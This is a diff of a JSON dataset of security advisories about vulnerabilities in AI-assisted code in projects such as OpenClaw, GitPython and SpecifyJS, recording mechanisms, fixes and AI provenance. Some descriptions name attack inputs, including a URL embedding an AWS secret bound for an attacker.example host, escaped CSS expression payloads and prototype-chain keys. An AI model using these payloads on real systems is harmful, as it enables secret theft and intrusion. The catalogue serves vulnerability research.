@@ -1656,9 +1656,8 @@
   },
   {
    "class_id": "alias-0d95fed3b98673811030d936",
-   "case_id": "GHSA-4564-PVR2-QQ4H",
+   "case_id": "GHSA-9f72-qcpw-2hxc",
    "aliases": [
-    "CVE-2026-27487",
     "alias-0d95fed3b98673811030d936"
    ],
    "repository": "openclaw/openclaw",
@@ -1667,83 +1666,10 @@
     "language": "TypeScript",
     "archived": false
    },
-   "mechanism": "GitHub-reviewed GHSA-4564-pvr2-qq4h aliases CVE-2026-27487 and names macOS Claude CLI keychain refresh writing token JSON via security add-generic-password -w through a shell. Parent 1281c1d1 only execSync-reads the keychain. Member a39951d4 (Co-Authored-By: Claude) first adds writeClaudeCliKeychainCredentials interpolating newValue into execSync(`security add-generic-password ... -w '${newValue.replace(...)}'`). Human 8b473681 later moves that sink into cli-credentials.ts without removing the shell. Minimum production reversal 9dce3d8b (#15924) switches the write to execFileSync(\"security\", argv). 66d7178f is a descendant of 9dce3d8b and only clears residual shell use; b9083882 is test cleanup. Published GitHub releases: v2026.2.12/v2026.2.13 contain origin without fix; v2026.2.14 contains 9dce3d8b.",
-   "description": "## Summary\nOn macOS, the Claude CLI keychain credential refresh path constructed a shell command to write the updated JSON blob into Keychain via `security add-generic-password -w ...`. Because OAuth tokens are user-controlled data, this created an OS command injection risk.\n\nThe fix avoids invoking a shell by using `execFileSync(\"security\", argv)` and passing the updated keychain payload as a literal argument.\n\n## Affected Packages / Versions\n- Package: `openclaw` (npm)\n- Platform: macOS only\n- Affected versions: `<= 2026.2.13`\n\n## Fix\n- Patched version: `>= 2026.2.14` (next release)\n- Fix PR: #15924\n- Fix commits (merged to `main`):\n - `9dce3d8bf83f13c067bc3c32291643d2f1f10a06`\n - `66d7178f2d6f9d60abad35797f97f3e61389b70c`\n - `b908388245764fb3586859f44d1dff5372b19caf`\n\nThanks @aether-ai-agent for reporting.",
-   "candidate_set": [
-    "9a3800d8e6e69bc0a125dca5760d47515e746454"
-   ],
-   "minimum_fix_set": [
-    "9dce3d8bf83f13c067bc3c32291643d2f1f10a06"
-   ],
-   "vulnerable_release": {
-    "contains_candidate_ancestor": true,
-    "contains_fix_ancestor": false,
-    "kind": "git_tag",
-    "sha": "a39951d463b9c5377cbe7e08d6953899dca708d8",
-    "tag": "v2026.2.13"
-   },
-   "fixed_release": {
-    "contains_fix_ancestor": true,
-    "kind": "git_tag",
-    "sha": "9dce3d8bf83f13c067bc3c32291643d2f1f10a06",
-    "tag": "v2026.2.14"
-   },
-   "published_at": "2026-02-18",
-   "severity": "HIGH",
-   "cwes": [
-    "CWE-78",
-    "CWE-78: IMPROPER NEUTRALIZATION OF SPECIAL ELEMENTS USED IN AN OS COMMAND ('OS COMMAND INJECTION')"
-   ],
-   "references": [
-    "https://github.com/openclaw/openclaw/security/advisories/GHSA-4564-pvr2-qq4h",
-    "https://nvd.nist.gov/vuln/detail/CVE-2026-27487",
-    "https://github.com/openclaw/openclaw/pull/15924",
-    "https://github.com/openclaw/openclaw/commit/66d7178f2d6f9d60abad35797f97f3e61389b70c",
-    "https://github.com/openclaw/openclaw/commit/9dce3d8bf83f13c067bc3c32291643d2f1f10a06",
-    "https://github.com/openclaw/openclaw/commit/b908388245764fb3586859f44d1dff5372b19caf",
-    "https://github.com/openclaw/openclaw",
-    "https://github.com/openclaw/openclaw/releases/tag/v2026.2.14"
-   ],
-   "cause_category": "injection",
-   "ai_provenance": {
-    "family": "claude",
-    "coverage": "complete",
-    "candidate_count": 1,
-    "named_candidate_count": 1,
-    "note": "Co-Authored-By: Claude Opus 4.6 on ce12b9092f0 (decomposed)"
-   },
-   "fix_authorship": {
-    "classification": "ai_assisted",
-    "families": [
-     "aether"
-    ],
-    "fixes": [
-     {
-      "author": {
-       "email": "github@tryaether.ai",
-       "name": "Aether AI"
-      },
-      "authored_at": "2026-02-15T03:06:10+11:00",
-      "classification": "ai_assisted",
-      "evidence": [
-       {
-        "family": "aether",
-        "kind": "author_identity",
-        "text": "Aether AI <github@tryaether.ai>"
-       }
-      ],
-      "families": [
-       "aether"
-      ],
-      "sha": "9dce3d8bf83f13c067bc3c32291643d2f1f10a06"
-     }
-    ]
-   },
+   "mechanism": "A prompt image loader turned each detected reference into a file read, and with a sandbox in play it resolved that path through the sandbox filesystem bridge, which maps the session's mounts to host paths; anything that mapped into a mount was accepted, so the workspace-only restriction the file tools enforce was never applied to the images the runner pulled into the prompt.",
+   "description": "The embedded agent runner gained a native image path: when the active model accepts images, the runner scans the current prompt and earlier user messages for image references, loads each referenced file, and attaches the result to the request as vision input. Paths on that path were resolved with the sandbox filesystem bridge, which maps a requested path onto the session's mounts, and a path under a mounted directory resolves successfully even when it sits outside the workspace.\n\nThat gap left images reachable through any mounted directory. With a sandbox in a workspace-only configuration, a prompt or a stored message that named a path under a mount such as /agent/secret.png had the file read and sent to the model as an image. The fix puts the workspace check back on the auto-load path: the loader takes a workspace-only flag from the effective agent configuration, checks each resolved path against the allowed root before reading, and the added tests drive both the current prompt and a history reference through a sandbox that mounts a directory outside the workspace.",
    "code_evidence": {
-    "ai_marker": "Co-Authored-By: Claude Opus 4.6 <noreply@anthropic.com>",
-    "summary": "AI-written code interpolated an OAuth token into a shell command for the macOS keychain, enabling OS command injection on affected versions.",
-    "candidate_url": "https://github.com/openclaw/openclaw/commit/9a3800d8e6e69bc0a125dca5760d47515e746454",
-    "fix_url": "https://github.com/openclaw/openclaw/commit/9dce3d8bf83f13c067bc3c32291643d2f1f10a06"
+    "summary": "OpenClaw's native prompt image auto-load read images named in a message or kept from earlier turns and attached them to the model's context, but the loader resolved paths through the sandbox mount table without consulting the workspace-only setting, so an image mounted outside the workspace could still reach the vision model."
    }
   },
   {
@@ -3107,7 +3033,7 @@
   },
   {
    "class_id": "alias-1b96ef8b7d6e0e3e1d35e5fd",
-   "case_id": "GHSA-3WXW-XV34-2FRG",
+   "case_id": "GHSA-94P4-4CQ8-9G67",
    "aliases": [
     "alias-1b96ef8b7d6e0e3e1d35e5fd"
    ],
@@ -3117,95 +3043,10 @@
     "language": "Python",
     "archived": false
    },
-   "mechanism": "TagReference positional file option",
-   "description": "TagReference positional file option",
-   "candidate_set": [
-    "3af0c2516c5e18c829da30338614688f6b69b49c"
-   ],
-   "minimum_fix_set": [
-    "1b0d2d9b91575f7db44ef4ff58ac37fc9335e5f6"
-   ],
-   "ir_chain": {
-    "original_advisory_ids": [
-     "GHSA-3F7W-8RR8-F37F"
-    ],
-    "original_mechanism": "TagReference.create accepted dangerous file options supplied through keyword arguments.",
-    "original_sink": "GitPython git/refs/tag.py TagReference.create option handling",
-    "original_author_kind": "HUMAN",
-    "original_author_name": "Sebastian Thiel",
-    "original_sha": "1047b41e2e925617474e2e7c9927314f71ce7365",
-    "unresolved_reason": null,
-    "attempted_remediation": {
-     "candidate_shas": [
-      "3af0c2516c5e18c829da30338614688f6b69b49c"
-     ],
-     "changed": "Added a denylist for --file and -F options passed through keyword arguments.",
-     "missed": "Did not inspect the positional reference and path arguments."
-    },
-    "residual_bypass": "A positional argument could still carry --file and select an attacker-controlled file.",
-    "final_closure": {
-     "minimum_fix_shas": [
-      "1b0d2d9b91575f7db44ef4ff58ac37fc9335e5f6"
-     ],
-     "closed": "Passed positional path and reference values through the same unsafe-option candidate check."
-    }
-   },
-   "vulnerable_release": {
-    "kind": "pypi_and_git_tag",
-    "sha": "30be45d786e95023e23c616fec5cbabca861b44c",
-    "tag": "3.1.58"
-   },
-   "fixed_release": {
-    "kind": "pypi_and_git_tag",
-    "sha": "66340d77aab9a7468f4aed3681d4ef1e3c0ec931",
-    "tag": "3.1.59"
-   },
-   "published_at": "2026-08-10",
-   "cause_category": "path_link",
-   "ai_provenance": {
-    "family": "openai_gpt_codex",
-    "coverage": "complete",
-    "candidate_count": 1,
-    "named_candidate_count": 1,
-    "note": "Author: GPT 5.5/5.6 <codex@openai.com>; Co-authored-by: Sebastian Thiel (human reviewer/co-author)"
-   },
-   "fix_authorship": {
-    "classification": "ai_assisted",
-    "families": [
-     "openai_codex"
-    ],
-    "fixes": [
-     {
-      "author": {
-       "email": "sebastian.thiel@icloud.com",
-       "name": "Byron"
-      },
-      "authored_at": "2026-08-05T04:48:36+02:00",
-      "classification": "ai_assisted",
-      "evidence": [
-       {
-        "family": "openai_codex",
-        "kind": "coauthor_trailer",
-        "text": "Co-authored-by: GPT 5.6 <codex@openai.com>"
-       },
-       {
-        "family": "openai_codex",
-        "kind": "explicit_attribution",
-        "text": "Assisted-by: GPT 5.6"
-       }
-      ],
-      "families": [
-       "openai_codex"
-      ],
-      "sha": "1b0d2d9b91575f7db44ef4ff58ac37fc9335e5f6"
-     }
-    ]
-   },
+   "mechanism": "The AI change added an expand_vars switch to the shared URL helper with expansion still on by default and turned it off only on the clone path, so create_remote and submodule URLs were still written into git configuration after os.path.expandvars had replaced ${...} references with process environment values; the completing change passes the switch at those two remaining callers.",
+   "description": "The advisory covers the second half of a two-part boundary. The previous release had removed environment-variable expansion from clone URLs, and the change that did so introduced the switch which made the removal possible. That switch left expansion enabled for every caller that did not opt out, and only the clone path opted out, so Remote.create, reached through Repo.create_remote and its Remote.add alias, and Submodule.add still normalized caller-supplied URLs with expansion on. A URL such as http://attacker.example/${AWS_SECRET_ACCESS_KEY}/repo.git was written into .git/config with the secret substituted, and the next fetch or pull transmitted it to the attacker's host; the submodule path also wrote the expanded value into the tracked .gitmodules file. The completing change passes expand_vars=False at those two remaining callers, so configuration keeps the literal URL and protocol validation sees the same bytes Git receives.",
    "code_evidence": {
-    "ai_marker": "Co-authored-by: Sebastian Thiel <sebastian.thiel@icloud.com>",
-    "summary": "AI-written code mishandled TagReference positional file options, leading to a vulnerability with unspecified impact.",
-    "candidate_url": "https://github.com/gitpython-developers/GitPython/commit/3af0c2516c5e18c829da30338614688f6b69b49c",
-    "fix_url": "https://github.com/gitpython-developers/GitPython/commit/1b0d2d9b91575f7db44ef4ff58ac37fc9335e5f6"
+    "summary": "An AI-assisted change stopped environment expansion on clone URLs but left the same expansion in the remote and submodule callers, so a URL passed to create_remote or add could embed the hosting process's secrets and carry them to the attacker's host."
    }
   },
   {
@@ -7066,10 +6907,7 @@
     ]
    },
    "code_evidence": {
-    "ai_marker": "Co-authored-by: Copilot <223556219+Copilot@users.noreply.github.com>",
-    "summary": "Copilot-assisted TypeScript code rendered attacker-controlled Nunjucks templates with host objects and unrestricted JavaScript member access. The direct fix blocks prototype traversal and function calls and exposes only copied own data.",
-    "candidate_url": "https://github.com/microsoft/prompty/commit/a0e6108842a3bfc840a33db819a4415fbdac333d",
-    "fix_url": "https://github.com/microsoft/prompty/commit/e4a0ebf49e3a78d5d7796c8480bf9a4f0c54d19e"
+    "summary": "Copilot-assisted TypeScript code rendered attacker-controlled Nunjucks templates with host objects and unrestricted JavaScript member access. The direct fix blocks prototype traversal and function calls and exposes only copied own data."
    }
   },
   {
@@ -14477,7 +14315,7 @@
   },
   {
    "class_id": "alias-b87b6c39f1e316817dfd1dfc",
-   "case_id": "GHSA-5XXX-QHH7-9287",
+   "case_id": "GHSA-P538-C434-8V24",
    "aliases": [
     "alias-b87b6c39f1e316817dfd1dfc"
    ],
@@ -14487,97 +14325,10 @@
     "language": "Python",
     "archived": false
    },
-   "mechanism": "The incomplete hardening registered option screens for archive and revision handling but never added a blame-specific deny list, so check_unsafe_options passed contents, revision-file and order-file straight through to git blame. That omission let the command read a file chosen by the caller.",
-   "description": "AI-written option screening added deny lists for archive and revision flags and applied revision checks in iter_commits and blame_incremental, but it defined no blame-specific deny list, so file-reading options reached git blame unscreened. An attacker able to influence those arguments could make the command read an arbitrary file instead of repository content, and the fix closes that route with separate blame and diff deny lists.",
-   "candidate_set": [
-    "701ce32fe5ba8cb622c0e0342a376a6beb47d738"
-   ],
-   "minimum_fix_set": [
-    "1b0d2d9b91575f7db44ef4ff58ac37fc9335e5f6"
-   ],
-   "ir_chain": {
-    "original_advisory_ids": [
-     "GHSA-5XXX-QHH7-9287"
-    ],
-    "original_mechanism": "Git blame accepted unsafe file-related revision options.",
-    "original_sink": "GitPython git/repo/base.py Repo.blame option handling",
-    "original_author_kind": "HUMAN",
-    "original_author_name": "Michael Trier",
-    "original_sha": "33ebe7acec14b25c5f84f35a664803fcab2f7781",
-    "unresolved_reason": null,
-    "attempted_remediation": {
-     "candidate_shas": [
-      "701ce32fe5ba8cb622c0e0342a376a6beb47d738"
-     ],
-     "changed": "Added --output and -o to the blame/revision option denylist.",
-     "missed": "Omitted --contents and -S."
-    },
-    "residual_bypass": "The omitted blame options could read an attacker-selected file as blame contents.",
-    "final_closure": {
-     "minimum_fix_shas": [
-      "1b0d2d9b91575f7db44ef4ff58ac37fc9335e5f6"
-     ],
-     "closed": "Added the contents options and positional values to the unsafe-option check."
-    }
-   },
-   "vulnerable_release": {
-    "contains_candidate_ancestor": true,
-    "contains_fix_ancestor": false,
-    "kind": "git_tag",
-    "sha": null,
-    "tag": "3.1.58"
-   },
-   "fixed_release": {
-    "contains_fix_ancestor": true,
-    "kind": "git_tag",
-    "sha": null,
-    "tag": "3.1.59"
-   },
-   "published_at": "2026-08-10",
-   "cause_category": "injection",
-   "ai_provenance": {
-    "family": "openai_gpt_codex",
-    "coverage": "complete",
-    "candidate_count": 1,
-    "named_candidate_count": 1,
-    "note": "Author: GPT 5.5/5.6 <codex@openai.com>; Co-authored-by: Sebastian Thiel (human reviewer/co-author)"
-   },
-   "fix_authorship": {
-    "classification": "ai_assisted",
-    "families": [
-     "openai_codex"
-    ],
-    "fixes": [
-     {
-      "author": {
-       "email": "sebastian.thiel@icloud.com",
-       "name": "Byron"
-      },
-      "authored_at": "2026-08-05T04:48:36+02:00",
-      "classification": "ai_assisted",
-      "evidence": [
-       {
-        "family": "openai_codex",
-        "kind": "coauthor_trailer",
-        "text": "Co-authored-by: GPT 5.6 <codex@openai.com>"
-       },
-       {
-        "family": "openai_codex",
-        "kind": "explicit_attribution",
-        "text": "Assisted-by: GPT 5.6"
-       }
-      ],
-      "families": [
-       "openai_codex"
-      ],
-      "sha": "1b0d2d9b91575f7db44ef4ff58ac37fc9335e5f6"
-     }
-    ]
-   },
+   "mechanism": "The hardening change introduced the shared unsafe-option list for rev-list and the guard that consumes it, but it applied the guard inside iter_items only, and Commit.count kept forwarding its keyword arguments into the same command with no check at all, so an output option reached git and truncated the named file.",
+   "description": "The advisory covers a sink that the previous hardening pass left behind. That pass, first released in 3.1.51, closed command injection through archive, ls-remote and the revision APIs by giving those APIs an unsafe-option denylist and a shared check, and it added the rev-list denylist plus that check to the commit iterator. The counting method on the same commit object forwards its keyword arguments into the same rev-list command, but it was never given the check, so a caller-influenced options mapping such as an output path reached git and truncated that file to zero bytes before any revision was parsed.\n\nThe destroying write is a zero-byte truncation rather than content control, and the revision is the commit's own object id, so reachability is limited to a caller who controls the forwarded options; the impact is the integrity and availability of any file the process can write. The completing fix runs the same check in the counting method before the command is built and adds the same escape hatch, so the option now raises an error instead of reaching git.",
    "code_evidence": {
-    "summary": "AI-written code in Repo.blame contents allowed arbitrary file reads, exposing sensitive files to attackers.",
-    "candidate_url": "https://github.com/gitpython-developers/gitpython/commit/701ce32fe5ba8cb622c0e0342a376a6beb47d738",
-    "fix_url": "https://github.com/gitpython-developers/gitpython/commit/1b0d2d9b91575f7db44ef4ff58ac37fc9335e5f6"
+    "summary": "An AI-assisted change added option screening for revision traversal but wired it only into the iterator that walks commits, so the counting method on the same commit kept forwarding a file-overwriting option to git and could blank any file the caller named."
    }
   },
   {
@@ -14990,9 +14741,9 @@
   },
   {
    "class_id": "alias-bea508942342f0c4320b400d",
-   "case_id": "GHSA-68V4-HMWV-F43H",
+   "case_id": "GHSA-c6hr-w26q-c636",
    "aliases": [
-    "CVE-2026-41345",
+    "CVE-2026-22178",
     "alias-bea508942342f0c4320b400d"
    ],
    "repository": "openclaw/openclaw",
@@ -15001,70 +14752,10 @@
     "language": "TypeScript",
     "archived": false
    },
-   "mechanism": "downloadToFile follows redirects while forwarding original Authorization-bearing headers; invariant: cross-origin redirects must drop unsafe headers.",
-   "description": "## Summary\nMedia download follows cross-origin redirects with Authorization headers intact\n\n## Current Maintainer Triage\n- Status: open\n- Normalized severity: medium\n- Assessment: Shipped v2026.3.28 media downloads forwarded Authorization across cross-origin redirects, a real in-scope credential-leak class that fits medium.\n\n## Affected Packages / Versions\n- Package: `openclaw` (npm)\n- Latest published npm version: `2026.3.31`\n- Vulnerable version range: `<=2026.3.28`\n- Patched versions: `>= 2026.3.31`\n- First stable tag containing the fix: `v2026.3.31`\n\n## Fix Commit(s)\n- `e704323ff388ed21f6963f9b8e0b1b8dfaaabc5f` \u2014 2026-03-31T19:57:42+09:00\n\nOpenClaw thanks @AntAISecurityLab for reporting.",
-   "candidate_set": [
-    "06dd9b8ed864eb6668d42c497f0615e743da483a"
-   ],
-   "minimum_fix_set": [
-    "f865a5455ee03924a444e9ba0f1c4743d8fb6566"
-   ],
-   "vulnerable_release": {
-    "contains_candidate_ancestor": true,
-    "contains_fix_ancestor": false,
-    "kind": "npm_githead",
-    "sha": "06dd9b8ed864eb6668d42c497f0615e743da483a",
-    "tag": "v2026.3.28"
-   },
-   "fixed_release": {
-    "contains_fix_ancestor": true,
-    "kind": "npm_githead",
-    "sha": "f865a5455ee03924a444e9ba0f1c4743d8fb6566",
-    "tag": "v2026.3.31"
-   },
-   "published_at": "2026-04-03",
-   "severity": "MEDIUM",
-   "cwes": [
-    "CWE-522",
-    "CWE-522 INSUFFICIENTLY PROTECTED CREDENTIALS"
-   ],
-   "references": [
-    "https://github.com/openclaw/openclaw/security/advisories/GHSA-68v4-hmwv-f43h",
-    "https://github.com/openclaw/openclaw/commit/e704323ff388ed21f6963f9b8e0b1b8dfaaabc5f",
-    "https://github.com/openclaw/openclaw",
-    "https://github.com/openclaw/openclaw/releases/tag/v2026.3.31",
-    "https://www.vulncheck.com/advisories/openclaw-authorization-header-leak-via-cross-origin-redirect-in-media-download"
-   ],
-   "cause_category": "ssrf_network",
-   "ai_provenance": {
-    "family": "claude",
-    "coverage": "complete",
-    "candidate_count": 1,
-    "named_candidate_count": 1,
-    "note": "Co-Authored-By: Claude Opus 4.6 on ce12b9092f0 (decomposed)"
-   },
-   "fix_authorship": {
-    "classification": "no_ai_marker",
-    "families": [],
-    "fixes": [
-     {
-      "author": {
-       "email": "pgondhi@nvidia.com",
-       "name": "pgondhi987"
-      },
-      "authored_at": "2026-03-31T13:52:11+05:30",
-      "classification": "no_ai_marker",
-      "evidence": [],
-      "families": [],
-      "sha": "f865a5455ee03924a444e9ba0f1c4743d8fb6566"
-     }
-    ]
-   },
+   "mechanism": "The mention-stripping helper turned every mention name and mention key into a regular expression source string instead of matching them as literal text, so metacharacters carried by that metadata were executed as pattern syntax: a nested-quantifier name makes each non-matching message backtrack exponentially, and an injected anchor or alternation removes content that was never meant to be stripped.",
+   "description": "Inbound Feishu messages carry a mention list alongside the text, and the plugin removed each mention from the body before handing the result to the agent. That removal built a regular expression directly from the mention name and from the mention key, with no escaping, so anything a sender could place in that metadata became part of the pattern.\n\nTwo consequences follow. A name shaped as a nested quantifier turns a single message into exponential backtracking and blocks the channel while it runs, and a name shaped as a pattern fragment changes which parts of the message are deleted before the model sees them. The fix escapes metacharacters in both values before the pattern is compiled, and the neighbouring mention helper in the same plugin already applied that escaping, so the safe form was present in the extension all along.",
    "code_evidence": {
-    "ai_marker": "Co-Authored-By: Claude <noreply@anthropic.com>",
-    "summary": "AI-written media-download code followed cross-origin redirects while keeping Authorization headers, leaking credentials to unintended origins.",
-    "candidate_url": "https://github.com/openclaw/openclaw/commit/06dd9b8ed864eb6668d42c497f0615e743da483a",
-    "fix_url": "https://github.com/openclaw/openclaw/commit/f865a5455ee03924a444e9ba0f1c4743d8fb6566"
+    "summary": "The imported Feishu plugin compiled message mention metadata straight into regular expressions, so a crafted mention name could either stall message processing with catastrophic backtracking or quietly delete message text that the sender never wrote as a pattern."
    }
   },
   {
@@ -18104,8 +17795,9 @@
   },
   {
    "class_id": "alias-ebdfb56b10acc655505c434e",
-   "case_id": "GHSA-5C7W-4WM3-85VW",
+   "case_id": "GHSA-93Q6-WWJH-JC6H",
    "aliases": [
+    "CVE-2026-50290",
     "alias-ebdfb56b10acc655505c434e"
    ],
    "repository": "asymmetric-effort/specifyjs",
@@ -18114,119 +17806,10 @@
     "language": "TypeScript",
     "archived": false
    },
-   "mechanism": "Count Claude-marked single-parent caa8fbfa M-8 warn-on-metacharacter that still concatenates into gql(). Do not count parent 5abd6575 concat-without-guard as origin. Do not bind this row to 30f9b76f. Count 25d1fb49 PT-002 warn-to-throw as the same-boundary amendment. graphql.ts blob 83221c09 is identical from caa8fbfa through npm 0.2.134/0.2.135.",
-   "description": "## Finding\n\n**Location**: `core/src/client/graphql.ts:66-80`\n\nThe `gql` template tag function warned about interpolated values containing GraphQL metacharacters (`{}():`) but still concatenated them into the query string, enabling potential GraphQL injection.\n\n## Status\n\n**Fixed in v0.2.136** \u2014 The `gql` function now throws an error when metacharacters are detected in interpolated values, forcing developers to use the `variables` parameter.",
-   "candidate_set": [
-    "caa8fbfa4d7d99e02dca3ee0df642b30a5d856cc"
-   ],
-   "minimum_fix_set": [
-    "25d1fb491d99479efdf501f5f75e0bb80c908f0a"
-   ],
-   "ir_chain": {
-    "original_advisory_ids": [
-     "GHSA-5C7W-4WM3-85VW"
-    ],
-    "original_mechanism": "Attacker-controlled GraphQL metacharacters reached query-string concatenation.",
-    "original_sink": "SpecifyJS graphql.ts gql() construction",
-    "original_author_kind": "AI",
-    "original_author_name": "Sam Caldwell",
-    "original_sha": "5abd65759440ec2f243e78320befd7d77c3b0e78",
-    "unresolved_reason": null,
-    "attempted_remediation": {
-     "candidate_shas": [
-      "caa8fbfa4d7d99e02dca3ee0df642b30a5d856cc"
-     ],
-     "changed": "Detected GraphQL metacharacters and emitted a warning.",
-     "missed": "Continued concatenating the value into gql() after the warning."
-    },
-    "residual_bypass": "A warned metacharacter payload still reached the GraphQL query sink.",
-    "final_closure": {
-     "minimum_fix_shas": [
-      "25d1fb491d99479efdf501f5f75e0bb80c908f0a"
-     ],
-     "closed": "Changed the warning path to throw before query construction."
-    }
-   },
-   "vulnerable_release": {
-    "advisory_range": "< 0.2.136",
-    "contains_candidate": true,
-    "contains_fix": false,
-    "git_tag_commit": "a84103e7dc3e3283279058d8f7e5a3c01a79fa3d",
-    "github_release_object": "404",
-    "kind": "npm_gitHead_equals_peeled_tag_commit",
-    "name": "@asymmetric-effort/specifyjs",
-    "npm_gitHead": "a84103e7dc3e3283279058d8f7e5a3c01a79fa3d",
-    "sha": "a84103e7dc3e3283279058d8f7e5a3c01a79fa3d",
-    "tag": "v0.2.135",
-    "tarball": "https://registry.npmjs.org/@asymmetric-effort/specifyjs/-/specifyjs-0.2.135.tgz",
-    "tarball_sha256": "06ef2f4f36baf2ba1be086bcd782171cbfb81477bddc25acc685b8a652fffa1c",
-    "version": "0.2.135"
-   },
-   "fixed_release": {
-    "advisory_first_patched": "0.2.136",
-    "contains_fix": true,
-    "equals_minimum_fix": true,
-    "git_tag_commit": "25d1fb491d99479efdf501f5f75e0bb80c908f0a",
-    "github_release_object": "404",
-    "kind": "npm_gitHead_equals_peeled_tag_commit_equals_fix",
-    "name": "@asymmetric-effort/specifyjs",
-    "npm_gitHead": "25d1fb491d99479efdf501f5f75e0bb80c908f0a",
-    "sha": "25d1fb491d99479efdf501f5f75e0bb80c908f0a",
-    "tag": "v0.2.136",
-    "tarball": "https://registry.npmjs.org/@asymmetric-effort/specifyjs/-/specifyjs-0.2.136.tgz",
-    "tarball_sha256": "924ad43cf57d1dcefeaec15b4a7fa53794fb50f5f365d62ac8c643cd34c78d10",
-    "version": "0.2.136"
-   },
-   "published_at": "2026-07-02",
-   "severity": "MEDIUM",
-   "cwes": [
-    "CWE-943"
-   ],
-   "references": [
-    "https://github.com/asymmetric-effort/specifyjs/security/advisories/GHSA-5c7w-4wm3-85vw",
-    "https://github.com/asymmetric-effort/specifyjs/commit/25d1fb491d99479efdf501f5f75e0bb80c908f0a",
-    "https://github.com/asymmetric-effort/specifyjs"
-   ],
-   "cause_category": "validation_fail_open",
-   "ai_provenance": {
-    "family": "claude",
-    "coverage": "complete",
-    "candidate_count": 1,
-    "named_candidate_count": 1,
-    "note": "Co-Authored-By: Claude Opus 4.6 (1M context)"
-   },
-   "fix_authorship": {
-    "classification": "ai_assisted",
-    "families": [
-     "claude_code"
-    ],
-    "fixes": [
-     {
-      "author": {
-       "email": "github@samcaldwell.net",
-       "name": "Sam Caldwell"
-      },
-      "authored_at": "2026-05-29T02:58:11+00:00",
-      "classification": "ai_assisted",
-      "evidence": [
-       {
-        "family": "claude_code",
-        "kind": "coauthor_trailer",
-        "text": "Co-Authored-By: Claude Opus 4.6 (1M context) <noreply@anthropic.com>"
-       }
-      ],
-      "families": [
-       "claude_code"
-      ],
-      "sha": "25d1fb491d99479efdf501f5f75e0bb80c908f0a"
-     }
-    ]
-   },
+   "mechanism": "The style serializer removed only the literal dangerous substrings from each value, leaving every other spelling of the same payload intact, so a value written with CSS unicode escapes or a comment between letters decoded back into a live expression or javascript URL in browsers that honor them.",
+   "description": "The pre-rendering server serializes component style objects into the style attribute of the generated HTML. Before version 0.2.136 the serializer deleted the exact substrings expression( and url(javascript: from a value and emitted whatever remained, which left escape forms such as \\65xpression( and comment-split forms such as exp/**/ression( untouched, while browsers decode both of them back to the dangerous keyword. A component that passed untrusted text into a style value could therefore still deliver an expression or a javascript URL to clients, and version 0.2.136 replaces the strip with a check that normalizes unicode escapes and removes comments before matching dangerous patterns.",
    "code_evidence": {
-    "ai_marker": "Co-Authored-By: Claude Opus 4.6 (1M context) <noreply@anthropic.com>",
-    "summary": "The AI-written code warned about GraphQL metacharacters in interpolated values but still concatenated them, enabling GraphQL injection.",
-    "candidate_url": "https://github.com/asymmetric-effort/specifyjs/commit/caa8fbfa4d7d99e02dca3ee0df642b30a5d856cc",
-    "fix_url": "https://github.com/asymmetric-effort/specifyjs/commit/25d1fb491d99479efdf501f5f75e0bb80c908f0a"
+    "summary": "SpecifyJS pre-rendering on 0.2.135 and earlier sanitized style values by deleting the literal strings expression( and url(javascript:, so escaped or comment-split spellings of the same payload survived into the style attribute of the rendered markup."
    }
   },
   {
@@ -19348,6 +18931,281 @@
    "description": "This bridge is the boundary between the isolated expression runtime and the n8n host process. Its array-element callback exists so isolate-side proxies can fetch individual entries of workflow data, and it read whatever index it was handed after checking only that the value it had navigated to was an array. Nothing rejected keys that are not real indices, so strings such as 'constructor' or '__lookupGetter__' followed the array's prototype chain rather than its elements and handed the isolate a host built-in. Because prototypes are shared with the main process, a write from an expression reached unrelated code in the same instance. The repaired build rejects any index that is not a non-negative integer and refuses to return functions, which closes that route. Both self-hosted and cloud instances running the isolated-vm expression engine were affected.",
    "code_evidence": {
     "summary": "The AI-assisted change that added the expression runtime's host bridge gave the isolate an array-element callback that never checked the index it was handed, so a crafted expression could climb through the array's prototype to a host built-in and pollute it in the main n8n process."
+   }
+  },
+  {
+   "class_id": "alias-0c1856ecc9f259fe50edd5af",
+   "case_id": "GHSA-GW85-XP4Q-5GP9",
+   "aliases": [
+    "CVE-2026-31998",
+    "alias-0c1856ecc9f259fe50edd5af"
+   ],
+   "repository": "openclaw/openclaw",
+   "repository_metadata": {
+    "full_name": "openclaw/openclaw",
+    "language": "TypeScript",
+    "archived": false
+   },
+   "mechanism": "The Synology Chat webhook handler authorized allowlist mode through a helper that returned true whenever the allowed list was empty. With the channel's default allowlist policy and no configured users, every inbound sender cleared the authorization check and reached agent dispatch, so the agent and its tools acted on messages from senders the operator never admitted. The fix deletes the empty-list shortcut and rejects the request with an explicit authorization error before dispatch when the allowlist is empty.",
+   "description": "The Synology Chat channel added in openclaw 2026.2.22 resolved its direct-message policy to allowlist by default and checked inbound senders against the configured allowed user list. That check ran through a helper which answered yes when the list was empty, so an operator who enabled the channel without naming any users got the opposite of the stated policy: the webhook accepted every sender Synology Chat delivered, and each message was dispatched to the agent with whatever tools the agent held. The released fix removes the empty-list shortcut so the helper matches nobody, and the handler now answers an empty allowlist with an explicit rejection instead of falling through to dispatch.",
+   "code_evidence": {
+    "summary": "Openclaw 2026.2.22 and 2026.2.23 shipped the Synology Chat channel with an empty allowlist treated as permission for every sender, so a deployment on the default allowlist policy accepted messages from unauthorized senders and passed them to agent dispatch."
+   }
+  },
+  {
+   "class_id": "alias-4fdb74a9ca3848a9fc21e342",
+   "case_id": "GHSA-5C7W-4WM3-85VW",
+   "aliases": [
+    "alias-4fdb74a9ca3848a9fc21e342"
+   ],
+   "repository": "asymmetric-effort/specifyjs",
+   "repository_metadata": {
+    "full_name": "asymmetric-effort/specifyjs",
+    "language": "TypeScript",
+    "archived": false
+   },
+   "mechanism": "Count Claude-marked single-parent caa8fbfa M-8 warn-on-metacharacter that still concatenates into gql(). Do not count parent 5abd6575 concat-without-guard as origin. Do not bind this row to 30f9b76f. Count 25d1fb49 PT-002 warn-to-throw as the same-boundary amendment. graphql.ts blob 83221c09 is identical from caa8fbfa through npm 0.2.134/0.2.135.",
+   "description": "## Finding\n\n**Location**: `core/src/client/graphql.ts:66-80`\n\nThe `gql` template tag function warned about interpolated values containing GraphQL metacharacters (`{}():`) but still concatenated them into the query string, enabling potential GraphQL injection.\n\n## Status\n\n**Fixed in v0.2.136** \u2014 The `gql` function now throws an error when metacharacters are detected in interpolated values, forcing developers to use the `variables` parameter.",
+   "code_evidence": {
+    "summary": "The AI-written code warned about GraphQL metacharacters in interpolated values but still concatenated them, enabling GraphQL injection."
+   },
+   "candidate_set": [
+    "caa8fbfa4d7d99e02dca3ee0df642b30a5d856cc"
+   ],
